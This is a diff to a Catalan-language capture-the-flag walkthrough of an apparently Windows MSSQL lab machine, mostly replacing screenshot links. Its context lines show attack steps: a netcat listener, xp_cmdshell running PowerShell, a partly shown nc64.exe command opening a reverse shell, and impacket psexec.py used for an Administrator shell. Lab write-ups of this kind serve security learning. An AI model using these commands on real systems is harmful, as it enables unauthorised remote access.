@@ -88,7 +88,6 @@ $ sudo nc -lvnp 443
 SQL> xp_cmdshell "powershell -c pwd";
 ```
 
-![[Pasted image 20220528084256.png]]
 
 En aquest directori no hi ha permisos d'execucció per l'usuari sql_svc així que haurem d'utilitzar el alguna ruta del seu directori.
 Després fem la petició de la reverse shell que tenim en local.
@@ -107,7 +106,7 @@ SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd
 
 El netcat ja haurà rebut la petició de la reverse shell al port 443
 
-![[Pasted image 20220528085113.png]]
+![[Pasted image 20220528174933.png]]
 
 
 Busquem la flag en el sistema i amb un `more` llegim el contingut
@@ -146,7 +145,7 @@ Ara podem executar `psexec.py` desde impacket per tenir una shell com Administra
 ```bash
 $ python3 psexec.py administrator@Target_IP
 ```
-![[Pasted image 20220528174821.png]]
+![[Pasted image 20220528174919.png]]
 La root flag es troba en el desktop de l'usuari
 
 
